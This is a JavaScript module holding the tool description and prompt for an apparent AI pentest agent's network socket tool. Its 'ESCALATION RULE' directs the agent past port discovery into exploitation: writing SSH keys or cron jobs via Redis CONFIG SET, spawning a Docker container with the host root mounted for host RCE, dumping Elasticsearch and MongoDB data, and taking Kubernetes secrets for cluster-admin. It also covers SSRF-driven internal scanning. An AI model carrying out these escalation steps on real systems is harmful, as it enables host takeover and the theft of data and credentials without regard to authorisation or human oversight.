import { NET_TOOL_NAME } from './constants.js'

export const DESCRIPTION = `Network socket operations: banner grabbing, port connectivity check, raw TCP/UDP send.`

export const PROMPT = `## ${NET_TOOL_NAME} — Network socket operations

### ESCALATION RULE — Never stop at "port is open":
1. Redis 6379 open → send PING/CONFIG GET dir/CONFIG SET dir+dbfilename → write SSH key or cron via RESP protocol
2. Docker 2375 open → POST /containers/create {"Image":"alpine","Cmd":["chroot","/host","/bin/sh"]} with HostConfig.Binds=["/:/host"] → host RCE
3. Elasticsearch 9200 open → GET /_cat/indices then GET /index/_search → dump all data
4. Kubernetes 6443 → GET /api/v1/namespaces/kube-system/secrets → SA tokens for cluster-admin escalation
5. MongoDB 27017 open (no auth banner) → can dump all databases without credentials

### Pentest use cases:
- After SSRF/XXE confirms internal access, probe with NetTool to enumerate services:
  scan_ports on discovered IPs from /proc/net/tcp to find Redis/ES/k8s
- Verify if Redis is unauthenticated: send PING → look for +PONG response
- Check if Docker daemon is exposed: check_open port 2375 → RCE if true
- Banner grab to identify software versions for CVE targeting

### Operations
- \`banner_grab\` — connect and read initial server banner (identify service + version)
- \`send\` — connect, send data, read response (Redis commands, HTTP requests, etc.)
- \`check_open\` — check if port is open (fast TCP connect probe)
- \`scan_ports\` — scan a list of ports on a target

### Input
- \`host\`: target hostname or IP (required)
- \`port\`: target port (required except for scan_ports)
- \`operation\`: banner_grab | send | check_open | scan_ports
- \`data\`: data to send (for send operation) — use "\\r\\n" for CRLF
- \`ports\`: port list for scan_ports
- \`ssl\`: use SSL/TLS (default: false)
- \`timeout_secs\`: connection timeout (default: 5, max: 30)
- \`protocol\`: tcp or udp (default: tcp)

### Common internal service ports to probe:
- Redis: 6379 — send "PING\\r\\n" → +PONG means unauthenticated access
- Elasticsearch: 9200 — HTTP GET /_cluster/health → no auth = data exfil
- Kubernetes API: 6443/8443 — TLS, bearer token may auto-auth
- Docker daemon: 2375 — no TLS = full RCE via container spawn
- Memcached: 11211 — send "stats\\r\\n"
- MongoDB: 27017 — banner "MongoDB" means unauthenticated

### Examples
- \`{ host: "10.0.0.1", port: 22, operation: "banner_grab" }\`
- \`{ host: "127.0.0.1", port: 6379, operation: "send", data: "*1\\r\\n$4\\r\\nPING\\r\\n" }\`
- \`{ host: "10.0.0.1", port: 2375, operation: "check_open" }\`
- \`{ host: "10.0.0.1", operation: "scan_ports", ports: [22,80,443,3306,5432,6379,9200,27017] }\`
`
